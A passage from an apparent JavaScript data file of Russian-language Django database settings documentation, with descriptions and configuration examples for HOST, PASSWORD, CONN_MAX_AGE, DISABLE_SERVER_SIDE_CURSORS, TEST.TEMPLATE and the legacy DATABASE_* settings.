    },
}}

# SQLite — типичные опции
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   BASE_DIR / 'db.sqlite3',
    'OPTIONS': {
        'timeout': 20,                               # секунды ожидания блокировки
        'init_command': 'PRAGMA journal_mode=WAL;',  # WAL для лучшей конкурентности
        'transaction_mode': 'IMMEDIATE',             # Django 5.1+
    },
}}

# Pool-параметры (Django 5.1+ — встроенный connection pooling для PostgreSQL)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'OPTIONS': {
        'pool': {
            'min_size': 2,
            'max_size': 10,
            'timeout':  10,
        },
    },
}}

# Pgbouncer — отдельные настройки для совместимости
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'OPTIONS': {
        'options': '-c default_transaction_isolation=read_committed',
    },
    'DISABLE_SERVER_SIDE_CURSORS': True,             # обязательно при transaction-pooling
}}`,
  },
  {
    name: "HOST",
    category: "Databases",
    description:
      'Адрес сервера базы данных. Может быть DNS-именем ("db.example.com"), IP-адресом ("10.0.0.5"), пустой строкой (по умолчанию — localhost через TCP) или путём к Unix socket ("/var/run/postgresql/" для PostgreSQL, "/tmp/mysql.sock" для MySQL). Для SQLite не используется. В контейнерных окружениях обычно указывается имя сервиса из docker-compose или Kubernetes Service.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'HOST': 'db.example.com',
    },
}`,
    arguments: [],
    example: `# Варианты HOST для PostgreSQL/MySQL

# 1. Localhost через TCP (значение по умолчанию)
'HOST': '',                          # или '127.0.0.1' / 'localhost'

# 2. Удалённый сервер по DNS
'HOST': 'db.example.com'

# 3. По IP
'HOST': '10.0.0.5'

# 4. Unix socket — быстрее TCP, без сетевого стека
# PostgreSQL:
'HOST': '/var/run/postgresql/'       # каталог с .s.PGSQL.5432
# MySQL:
'HOST': '/var/run/mysqld/mysqld.sock'

# 5. Docker Compose — имя сервиса из docker-compose.yml
'HOST': 'postgres'                   # service: postgres
'HOST': 'db'                         # service: db

# 6. Kubernetes — DNS имя Service
'HOST': 'postgres.default.svc.cluster.local'
'HOST': 'postgres'                   # внутри одного namespace

# 7. Облачные managed-БД
'HOST': 'mydb.abcdefghijkl.us-east-1.rds.amazonaws.com'    # AWS RDS
'HOST': '10.123.45.67'                                      # Cloud SQL Private IP
'HOST': 'mydb.postgres.database.azure.com'                  # Azure
'HOST': 'mydb.replit.app'                                   # Replit DB host

# Через переменные окружения (рекомендуется для production)
import os
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'HOST':     os.environ.get('PGHOST', 'localhost'),
    'PORT':     os.environ.get('PGPORT', '5432'),
    'NAME':     os.environ['PGDATABASE'],
    'USER':     os.environ['PGUSER'],
    'PASSWORD': os.environ['PGPASSWORD'],
}}

# SQLite — HOST игнорируется
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   BASE_DIR / 'db.sqlite3',
    # 'HOST' указывать не нужно
}}`,
  },
  {
    name: "NAME",
    category: "Databases",
    description:
      'Имя базы данных, к которой подключается Django. Для PostgreSQL/MySQL/Oracle — имя БД на сервере, которая должна существовать (Django её НЕ создаёт автоматически, кроме как для тестов). Для SQLite — путь к файлу БД (рекомендуется передавать как Path-объект, например, BASE_DIR / "db.sqlite3"). Для in-memory SQLite — ":memory:" (полезно в тестах). Для Oracle может быть TNS-именем или полным connection string.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'NAME': 'mydb',
    },
}`,
    arguments: [],
    example: `# PostgreSQL / MySQL — имя БД на сервере
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    # БД должна быть создана заранее:
    # createdb mydb     (PostgreSQL)
    # CREATE DATABASE mydb CHARACTER SET utf8mb4;   (MySQL)
}}

# SQLite — путь к файлу
from pathlib import Path
BASE_DIR = Path(__file__).resolve().parent.parent

DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   BASE_DIR / 'db.sqlite3',           # ← Path-объект (рекомендуется)
    # или строка:
    # 'NAME': '/var/data/myapp.db',
}}

# SQLite in-memory (для быстрых тестов)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   ':memory:',
}}

# Oracle — TNS-имя или полный DSN
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.oracle',
    'NAME':   'xe',                              # TNS-имя из tnsnames.ora
    # или:
    # 'NAME': 'host:1521/service_name',
}}

# Разделение по окружениям через переменные
import os
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   os.environ.get('DB_NAME', 'mydb_dev'),
}}

# Тестовая БД — отдельные настройки в TEST
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'TEST': {
        'NAME': 'test_mydb_custom',              # имя БД, создаваемой для тестов
        # по умолчанию: 'test_' + NAME
    },
}}

# Создание БД при первом запуске (для PostgreSQL не делается автоматически):
# manage.py migrate                             # создаёт ТАБЛИЦЫ, но не саму БД
# Сначала вручную: createdb mydb`,
  },
  {
    name: "USER",
    category: "Databases",
    description:
      "Имя пользователя БД, под которым Django подключается к серверу. Пользователь должен быть создан на сервере БД и иметь права на NAME (обычно: SELECT, INSERT, UPDATE, DELETE, CREATE, ALTER, DROP, INDEX, REFERENCES — для миграций; SELECT/INSERT/UPDATE/DELETE — для read-only пользователей). Для SQLite не используется. По умолчанию пустая строка — для PostgreSQL/MySQL означает «текущий ОС-пользователь» (peer/ident-аутентификация).",
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'USER': 'myuser',
    },
}`,
    arguments: [],
    example: `# Production — пользователь только для приложения
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'NAME':     'mydb',
    'USER':     'myapp_user',
    'PASSWORD': os.environ['DB_PASSWORD'],
}}

# Создание пользователя на стороне БД:
# PostgreSQL:
#   CREATE USER myapp_user WITH PASSWORD '...';
#   GRANT ALL PRIVILEGES ON DATABASE mydb TO myapp_user;
#   ALTER DATABASE mydb OWNER TO myapp_user;     # чтобы migrate мог CREATE TABLE
#
# MySQL:
#   CREATE USER 'myapp_user'@'%' IDENTIFIED BY '...';
#   GRANT ALL ON mydb.* TO 'myapp_user'@'%';
#   FLUSH PRIVILEGES;

# Read-only пользователь для аналитики/реплик
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'mydb',
        'USER':   'myapp_user',          # полные права
    },
    'replica': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'mydb',
        'HOST':   'replica.example.com',
        'USER':   'readonly_user',       # только SELECT
    },
}

# Peer/ident-аутентификация (USER = ОС-пользователь)
# Используется на dev-машинах с Unix socket и pg_hba.conf:
#   local all all peer
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'USER':   '',                        # → текущий ОС-пользователь (например, "deploy")
    'PASSWORD': '',                      # не нужен при peer-аутентификации
    'HOST':   '/var/run/postgresql/',
}}

# Облачные сервисы — пользователь обычно admin или назначаемый при создании
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'USER':   'postgres',                # AWS RDS default master user
    'HOST':   'mydb.xxx.rds.amazonaws.com',
}}`,
  },
  {
    name: "PASSWORD",
    category: "Databases",
    description:
      "Пароль пользователя БД. Никогда не должен быть закоммичен в репозиторий — обязательно передавать через переменные окружения, секреты Replit, hashicorp Vault, AWS Secrets Manager и т. п. Пустая строка означает аутентификацию без пароля (peer/ident/trust в PostgreSQL, OS-аутентификация в MySQL). При использовании IAM-аутентификации (AWS RDS) пароль — это короткоживущий токен, обновляемый периодически.",
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'PASSWORD': os.environ['DB_PASSWORD'],
    },
}`,
    arguments: [],
    example: `import os

# Правильно — из переменной окружения
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'NAME':     'mydb',
    'USER':     'myuser',
    'PASSWORD': os.environ['DB_PASSWORD'],       # KeyError если не задан — это хорошо
    'HOST':     'db.example.com',
}}

# С дефолтом для разработки (но не для production!)
'PASSWORD': os.environ.get('DB_PASSWORD', 'dev_password')

# Из django-environ (.env файл)
import environ
env = environ.Env()
env.read_env(BASE_DIR / '.env')              # .env в .gitignore!
DATABASES = {'default': {
    'PASSWORD': env('DB_PASSWORD'),
}}

# Из AWS Secrets Manager
import boto3, json
def get_db_password():
    client = boto3.client('secretsmanager', region_name='us-east-1')
    resp = client.get_secret_value(SecretId='prod/db/password')
    return json.loads(resp['SecretString'])['password']

DATABASES = {'default': {
    'PASSWORD': get_db_password(),
}}

# IAM-аутентификация для AWS RDS (короткоживущие токены)
import boto3
def get_rds_token():
    client = boto3.client('rds', region_name='us-east-1')
    return client.generate_db_auth_token(
        DBHostname='mydb.xxx.rds.amazonaws.com',
        Port=5432,
        DBUsername='myuser',
    )

DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'HOST':     'mydb.xxx.rds.amazonaws.com',
    'USER':     'myuser',
    'PASSWORD': get_rds_token(),                 # токен живёт 15 минут
    'OPTIONS': {'sslmode': 'require'},
}}
# ВНИМАНИЕ: токен обновляется только при перезапуске процесса.
# Для long-running процессов лучше CONN_MAX_AGE=0 + custom Auth-плагин.

# НЕПРАВИЛЬНО — никогда так не делать
'PASSWORD': 'mypass123'                          # утечка через git
'PASSWORD': open('password.txt').read()          # файл может попасть в repo

# .gitignore обязательно содержит:
# .env
# *.env.local
# secrets.json`,
  },
  {
    name: "PORT",
    category: "Databases",
    description:
      'Сетевой порт сервера БД. Если пусто — используется порт по умолчанию для выбранного ENGINE: PostgreSQL — 5432, MySQL — 3306, Oracle — 1521, MS SQL — 1433. Указывается строкой ("5432") или числом (5432). Для SQLite не используется. Меняется при нестандартной конфигурации сервера, использовании connection pooler (pgbouncer обычно слушает 6432), SSH-туннеля (любой свободный порт локально).',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'PORT': '5432',
    },
}`,
    arguments: [],
    example: `# Стандартные порты (можно не указывать)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'PORT':   '5432',                # PostgreSQL default
}}

# MySQL default
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.mysql',
    'PORT':   '3306',
}}

# Oracle default
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.oracle',
    'PORT':   '1521',
}}

# Pgbouncer — connection pooler перед PostgreSQL
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'HOST':   'pgbouncer.internal',
    'PORT':   '6432',                # pgbouncer обычный порт
    'DISABLE_SERVER_SIDE_CURSORS': True,   # обязательно для transaction-pooling
}}

# SSH-туннель к удалённой БД (порт локальный)
# ssh -L 5433:db.internal:5432 user@bastion.example.com
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'HOST':   'localhost',
    'PORT':   '5433',                # локальный конец туннеля
}}

# Несколько серверов БД на одном хосте (разные порты)
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'HOST':   'db.example.com',
        'PORT':   '5432',
        'NAME':   'main',
    },
    'analytics': {
        'ENGINE': 'django.db.backends.postgresql',
        'HOST':   'db.example.com',
        'PORT':   '5433',            # отдельный кластер на том же хосте
        'NAME':   'analytics',
    },
}

# Из переменных окружения
import os
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'HOST':   os.environ.get('PGHOST', 'localhost'),
    'PORT':   os.environ.get('PGPORT', '5432'),
}}

# Допускаются и строка, и число — Django приведёт к нужному типу
'PORT': 5432       # OK
'PORT': '5432'     # OK (рекомендуется)`,
  },
  {
    name: "CONN_MAX_AGE",
    category: "Databases",
    description:
      "Максимальное время (в секундах) удержания соединения с БД для повторного использования между запросами (persistent connections). По умолчанию 0 — соединение закрывается после каждого запроса (новое подключение для каждого HTTP-запроса). Положительное значение — соединение живёт указанное число секунд. None — соединение живёт неограниченно. Уменьшает накладные расходы на установку TCP+TLS+аутентификацию для каждого запроса. Не использовать с pgbouncer transaction-pooling; не использовать в async-views без CONN_HEALTH_CHECKS.",
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'CONN_MAX_AGE': 60,
    },
}`,
    arguments: [],
    example: `# По умолчанию — без переиспользования
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'CONN_MAX_AGE': 0,               # каждый запрос → новый коннект
}}
# Минус: на каждый HTTP-запрос — TCP+TLS+аутентификация (10-50 мс overhead).

# Persistent connections — рекомендуется для production
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'CONN_MAX_AGE': 60,              # держать соединение 60 секунд
    'CONN_HEALTH_CHECKS': True,      # Django 4.1+ — проверять перед использованием
}}
# Каждый worker держит до 1 коннекта.
# Общее количество коннектов: workers × DATABASES.

# Неограниченно — для long-running процессов (Celery worker)
DATABASES = {'default': {
    'CONN_MAX_AGE': None,            # никогда не закрывать
    'CONN_HEALTH_CHECKS': True,      # обязательно с None
}}

# Расчёт пула на стороне сервера PostgreSQL:
#   max_connections (в postgresql.conf) ≥ workers × instances + запас
#
# Пример: 4 gunicorn workers × 3 инстанса = 12 коннектов на приложение.
# Если max_connections=100, можно ещё запас на админ/сервисы.

# НЕ ИСПОЛЬЗОВАТЬ CONN_MAX_AGE > 0 если:
# 1. Pgbouncer в transaction-pooling режиме
#    (он сам управляет соединениями, Django путается)
# 2. AWS RDS Proxy в одном из режимов
# 3. Бэкенд встроенного pool из Django 5.1 (OPTIONS["pool"]) — он делает то же

# Async views — обязательно CONN_HEALTH_CHECKS
DATABASES = {'default': {
    'ENGINE':       'django.db.backends.postgresql',
    'CONN_MAX_AGE': 60,
    'CONN_HEALTH_CHECKS': True,      # async может вызвать stale connection
}}

# Замер эффекта — типичные цифры:
#   CONN_MAX_AGE = 0   → 30-50 ms overhead на запрос (TLS handshake)
#   CONN_MAX_AGE = 60  → 0-2 ms (просто проверка соединения)

# Для скриптов management.py — не имеет эффекта:
#   manage.py команды создают коннект один раз и работают.

# С Django 5.1 встроенным pool настройка частично заменяется:
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'OPTIONS': {
        'pool': {'min_size': 2, 'max_size': 10},
    },
    # CONN_MAX_AGE и CONN_HEALTH_CHECKS управляются пулом
}}`,
  },
  {
    name: "CONN_HEALTH_CHECKS",
    category: "Databases",
    description:
      'Логическая настройка (Django 4.1+) внутри DATABASES[alias]. При True перед использованием переиспользуемого соединения (CONN_MAX_AGE > 0 или None) Django проверяет, что коннект ещё жив; если нет — закрывает и открывает новый. Решает проблему "stale connections": сервер БД закрыл соединение по своему таймауту, а Django об этом не знает и получает OperationalError на первом запросе. По умолчанию False. Практически обязательно при CONN_MAX_AGE=None и для async-views.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'CONN_MAX_AGE': 60,
        'CONN_HEALTH_CHECKS': True,
    },
}`,
    arguments: [],
    example: `# Production с persistent connections
DATABASES = {'default': {
    'ENGINE':            'django.db.backends.postgresql',
    'NAME':              'mydb',
    'CONN_MAX_AGE':      60,         # держать коннект 60 сек
    'CONN_HEALTH_CHECKS': True,      # проверять перед использованием
}}

# Что делает проверка:
# Перед обработкой каждого HTTP-запроса:
#   1. Достаём коннект из thread-local
#   2. Выполняем дешёвый запрос: SELECT 1 (или is_usable() для бэкенда)
#   3. Если ОК — используем
#   4. Если OperationalError — закрываем и открываем новый
# Накладные расходы: ~0.5 ms на запрос (один RTT до БД).

# Проблема, которую решает CONN_HEALTH_CHECKS:
# Без неё:
#   1. Django открыл коннект, выполнил запрос, оставил в пуле
#   2. PostgreSQL закрыл коннект через idle_in_transaction_session_timeout
#      или firewall сбросил TCP по неактивности
#   3. Следующий HTTP-запрос → Django пробует SELECT через мёртвый коннект
#      → django.db.utils.OperationalError: server closed the connection unexpectedly
#   4. Пользователь получает 500
# С CONN_HEALTH_CHECKS=True шаг 3 заменяется на проверку → старый коннект
# пересоздаётся прозрачно для пользователя.

# Когда обязательно True:
DATABASES = {'default': {
    'CONN_MAX_AGE': None,            # вечные коннекты
    'CONN_HEALTH_CHECKS': True,      # ОБЯЗАТЕЛЬНО — иначе stale-проблема
}}

# Async views — обязательно
# (async может вызываться через долгое время после получения коннекта)
ASGI_APPLICATION = 'myproject.asgi.application'
DATABASES = {'default': {
    'CONN_MAX_AGE':      60,
    'CONN_HEALTH_CHECKS': True,
}}

# Когда не нужно (False):
#   - CONN_MAX_AGE = 0 (новый коннект на каждый запрос — не из чего болеть)
#   - В management-командах (создаётся коннект один раз)
#   - При использовании пула из Django 5.1 (OPTIONS["pool"]) — пул сам проверяет

# Не панацея: на коротких таймаутах firewall (30 сек) и при простое
# HTTP-запросов > 30 сек проверка не успевает спасти. Решение — синхронизировать:
#   PG idle_in_transaction_session_timeout > CONN_MAX_AGE > firewall idle timeout`,
  },
  {
    name: "DISABLE_SERVER_SIDE_CURSORS",
    category: "Databases",
    description:
      'Логическая настройка внутри DATABASES[alias] для PostgreSQL-бэкенда. При True Django не использует server-side cursors для итерации больших QuerySet через .iterator(). Server-side cursors хранят состояние запроса на сервере PostgreSQL и поэтому несовместимы с pgbouncer в режимах transaction/statement pooling, где соединение между запросами может меняться. Без этой настройки .iterator() ломается с ошибкой "InvalidCursorName". По умолчанию False (cursors включены).',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'DISABLE_SERVER_SIDE_CURSORS': True,
    },
}`,
    arguments: [],
    example: `# Конфигурация для pgbouncer (transaction-pooling)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'HOST':   'pgbouncer.internal',
    'PORT':   '6432',                              # pgbouncer
    'DISABLE_SERVER_SIDE_CURSORS': True,           # ОБЯЗАТЕЛЬНО
}}

# Что такое server-side cursors:
# Без DISABLE_SERVER_SIDE_CURSORS Django делает для .iterator():
#   DECLARE _django_curs_140234... CURSOR FOR SELECT ... FROM ...;
#   FETCH FORWARD 2000 FROM _django_curs_...;     # порциями
#   FETCH FORWARD 2000 FROM _django_curs_...;
#   CLOSE _django_curs_...;
# Это позволяет работать с гигантскими таблицами без загрузки всех строк
# в память Django — сервер сам подаёт данные пачками.

# Проблема с pgbouncer (transaction pool):
# 1. Django: DECLARE cursor → pgbouncer выдаёт connection A → выполнено
# 2. Транзакция закончилась → pgbouncer вернул A в пул
# 3. Django: FETCH ... → pgbouncer выдаёт уже connection B → cursor не существует
#    → ProgrammingError: cursor "_django_curs_..." does not exist

# Что меняется при DISABLE_SERVER_SIDE_CURSORS = True:
# .iterator() начинает использовать client-side cursor, т. е. fetchall()
# с разбиением в Python. Это:
#   + работает с pgbouncer
#   - грузит все строки в память Django (теряется главное преимущество iterator)

# Альтернатива .iterator() при отключённых cursors — пагинация по pk:
def chunked(qs, chunk_size=2000):
    last_pk = 0
    while True:
        chunk = list(qs.filter(pk__gt=last_pk).order_by('pk')[:chunk_size])
        if not chunk:
            return
        yield from chunk
        last_pk = chunk[-1].pk

for obj in chunked(LargeModel.objects.all()):
    process(obj)

# Когда оставить False (по умолчанию):
#   - Прямое подключение к PostgreSQL без pgbouncer
#   - Pgbouncer в session-pooling режиме (один клиент = одно соединение)
#   - AWS RDS Proxy в режиме session pinning

# Когда обязательно True:
#   - Pgbouncer в transaction pooling
#   - Pgbouncer в statement pooling
#   - Любой connection multiplexer на уровне транзакций`,
  },
  {
    name: "TEST.TEMPLATE",
    category: "Databases",
    description:
      'Опция внутри DATABASES[alias]["TEST"] (PostgreSQL-only). Имя существующей БД, которая будет использована как шаблон (template) при создании тестовой БД через CREATE DATABASE ... TEMPLATE .... По умолчанию используется системный template1. Установка кастомного шаблона ускоряет создание тестовой БД, если в шаблоне уже созданы расширения (postgis, pg_trgm), процедуры или предзагруженные данные. Шаблон не должен иметь активных подключений в момент создания тестовой БД.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        ...,
        'TEST': {'TEMPLATE': 'my_test_template'},
    },
}`,
    arguments: [],
    example: `# settings.py — использовать кастомный шаблон
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'TEST': {
        'NAME':     'test_mydb',                  # имя тестовой БД
        'TEMPLATE': 'mydb_test_template',         # на основе чего создавать
    },
}}

# Зачем:
# Когда manage.py test запускается, Django выполняет:
#   CREATE DATABASE test_mydb TEMPLATE mydb_test_template;
# Это копирует структуру и данные шаблона мгновенно (cluster-level COW).

# Сценарий: PostGIS-расширение
# 1. Один раз создать template:
#   CREATE DATABASE postgis_template;
#   \\c postgis_template
#   CREATE EXTENSION postgis;
#   CREATE EXTENSION postgis_topology;
#   UPDATE pg_database SET datistemplate = true WHERE datname = 'postgis_template';
#
# 2. settings.py:
DATABASES = {'default': {
    'ENGINE': 'django.contrib.gis.db.backends.postgis',
    'NAME':   'mydb',
    'TEST': {'TEMPLATE': 'postgis_template'},
}}
# 3. manage.py test → CREATE EXTENSION выполняется один раз в шаблоне,
#    каждая тестовая БД сразу создаётся с включённым PostGIS.
# Без TEMPLATE Django пришлось бы запускать миграции PostGIS каждый раз.

# Шаблон с предзагруженным фикстурным датасетом
# 1. createdb seed_template
# 2. psql seed_template < schema.sql
# 3. psql seed_template < seed_data.sql
# 4. UPDATE pg_database SET datistemplate=true WHERE datname='seed_template';
# 5. settings.py: TEST: {'TEMPLATE': 'seed_template'}

# Ограничения:
#   - Шаблон не должен иметь активных коннектов
#     (закрыть IDE / pgAdmin перед запуском тестов)
#   - Шаблон должен быть доступен пользователю DATABASES["default"]["USER"]
#   - PostgreSQL-only

# Альтернатива — --keepdb (быстрее на втором запуске):
# manage.py test --keepdb
# Не пересоздаёт тестовую БД между запусками; миграции применяются инкрементально.`,
  },
  {
    name: "DATABASE_ENGINE",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2). Указывала бэкенд БД одной строкой без префикса "django.db.backends." — например, "postgresql_psycopg2", "mysql", "sqlite3". Удалена в Django 1.9 (декабрь 2015). Современный эквивалент — DATABASES["default"]["ENGINE"] с полным путём импорта "django.db.backends.postgresql". Сохранилась только в очень старых проектах и документации до 2015 года.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_ENGINE = 'postgresql_psycopg2'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_ENGINE   = 'postgresql_psycopg2'
DATABASE_NAME     = 'mydb'
DATABASE_USER     = 'myuser'
DATABASE_PASSWORD = 'mypass'
DATABASE_HOST     = 'localhost'
DATABASE_PORT     = '5432'
DATABASE_OPTIONS  = {}

# СОВРЕМЕННЫЙ эквивалент (Django 1.2+, обязателен с 1.9):
DATABASES = {
    'default': {
        'ENGINE':   'django.db.backends.postgresql',
        'NAME':     'mydb',
        'USER':     'myuser',
        'PASSWORD': 'mypass',
        'HOST':     'localhost',
        'PORT':     '5432',
        'OPTIONS':  {},
    }
}

# Соответствие старых значений новым:
# DATABASE_ENGINE = 'postgresql_psycopg2' → ENGINE = 'django.db.backends.postgresql'
# DATABASE_ENGINE = 'mysql'               → ENGINE = 'django.db.backends.mysql'
# DATABASE_ENGINE = 'sqlite3'             → ENGINE = 'django.db.backends.sqlite3'
# DATABASE_ENGINE = 'oracle'              → ENGINE = 'django.db.backends.oracle'

# Если вы видите DATABASE_ENGINE в коде — это либо:
#   1. Очень старый проект (до Django 1.2, до 2010 года)
#   2. Кастомная переменная окружения (не Django-настройка),
#      которая используется в settings.py для построения DATABASES:
#      DATABASES = {'default': {
#          'ENGINE': os.environ.get('DATABASE_ENGINE',
#                                   'django.db.backends.postgresql'),
#          ...
#      }}
# Во втором случае это просто имя env-переменной и оно не имеет отношения
# к удалённой настройке Django.

# Миграция со старого синтаксиса — заменить блок ровно один раз перед
# обновлением Django до 1.9.`,
  },
  {
    name: "DATABASE_HOST",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Указывала хост сервера БД отдельной переменной. Современный эквивалент — DATABASES["default"]["HOST"]. В современном коде имя переменной DATABASE_HOST встречается только как convention для переменной окружения (например, через os.environ["DATABASE_HOST"]) или как имя поля в .env-файле, которое потом подставляется в DATABASES.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_HOST = 'db.example.com'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_HOST = 'db.example.com'

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        ...,
        'HOST': 'db.example.com',
    },
}

# Использование DATABASE_HOST как имени env-переменной (это допустимо)
import os
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'HOST':   os.environ.get('DATABASE_HOST', 'localhost'),
        'PORT':   os.environ.get('DATABASE_PORT', '5432'),
        'NAME':   os.environ.get('DATABASE_NAME', 'mydb'),
        'USER':   os.environ.get('DATABASE_USER', 'myuser'),
        'PASSWORD': os.environ['DATABASE_PASSWORD'],
    },
}

# .env-файл в этом случае:
#   DATABASE_HOST=db.example.com
#   DATABASE_PORT=5432
#   DATABASE_NAME=mydb
#   DATABASE_USER=myuser
#   DATABASE_PASSWORD=secret

# Это просто соглашение об именовании переменных окружения, а не настройка Django.

# Альтернатива — DATABASE_URL (стандарт, поддерживаемый django-environ, dj-database-url):
import environ
env = environ.Env()
DATABASES = {'default': env.db('DATABASE_URL')}
# DATABASE_URL=postgres://user:pass@db.example.com:5432/mydb`,
  },
  {
    name: "DATABASE_NAME",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Указывала имя базы данных. Современный эквивалент — DATABASES["default"]["NAME"]. Имя DATABASE_NAME часто продолжают использовать как переменную окружения, которая в settings.py подставляется в DATABASES["default"]["NAME"].',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_NAME = 'mydb'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_NAME = 'mydb'

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        ...,
        'NAME': 'mydb',
    },
}

# DATABASE_NAME как env-переменная (обычная практика)
import os
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   os.environ['DATABASE_NAME'],         # обязательная
    'HOST':   os.environ.get('DATABASE_HOST', 'localhost'),
    'USER':   os.environ.get('DATABASE_USER', 'postgres'),
    'PASSWORD': os.environ.get('DATABASE_PASSWORD', ''),
    'PORT':   os.environ.get('DATABASE_PORT', '5432'),
}}

# Heroku/Railway/Replit — обычно DATABASE_URL вместо отдельных переменных:
#   postgres://user:pass@host:5432/dbname
#                                  └── это DATABASE_NAME
import dj_database_url
DATABASES = {'default': dj_database_url.config('DATABASE_URL')}

# Проверка наличия (защита от тихого фолбэка)
if not os.environ.get('DATABASE_NAME'):
    raise RuntimeError('DATABASE_NAME не задана')
DATABASES = {'default': {'NAME': os.environ['DATABASE_NAME'], ...}}`,
  },
  {
    name: "DATABASE_USER",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Указывала имя пользователя БД. Современный эквивалент — DATABASES["default"]["USER"]. Как и другие DATABASE_* настройки, имя сохранилось в практике как convention для имени переменной окружения, не как настройка Django.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_USER = 'myuser'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_USER = 'myuser'

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        ...,
        'USER': 'myuser',
    },
}

# DATABASE_USER как env-переменная (распространённое имя)
import os
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'NAME':     os.environ['DATABASE_NAME'],
    'USER':     os.environ.get('DATABASE_USER', 'postgres'),
    'PASSWORD': os.environ['DATABASE_PASSWORD'],
    'HOST':     os.environ.get('DATABASE_HOST', 'localhost'),
    'PORT':     os.environ.get('DATABASE_PORT', '5432'),
}}

# В Docker Compose / docker .env-файле:
# DATABASE_USER=myapp
# DATABASE_PASSWORD=secret
# DATABASE_NAME=myapp
# DATABASE_HOST=db
# DATABASE_PORT=5432

# В Kubernetes — через ConfigMap + Secret:
# env:
#   - name: DATABASE_USER
#     valueFrom:
#       secretKeyRef:
#         name: db-credentials
#         key: username
#   - name: DATABASE_PASSWORD
#     valueFrom:
#       secretKeyRef:
#         name: db-credentials
#         key: password`,
  },
  {
    name: "DATABASE_PASSWORD",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Указывала пароль пользователя БД. Современный эквивалент — DATABASES["default"]["PASSWORD"]. По convention имя DATABASE_PASSWORD используется для соответствующей переменной окружения. Никогда не должно храниться в репозитории.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_PASSWORD = 'secret'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_PASSWORD = 'secret'                     # ❌ ещё и в коде — двойная ошибка

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        ...,
        'PASSWORD': os.environ['DATABASE_PASSWORD'],
    },
}

# Через переменную окружения
import os
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'PASSWORD': os.environ['DATABASE_PASSWORD'],
    # обязательно через env, KeyError при отсутствии — это правильно
}}

# Через django-environ + .env (.env в .gitignore!)
import environ
env = environ.Env()
env.read_env(BASE_DIR / '.env')
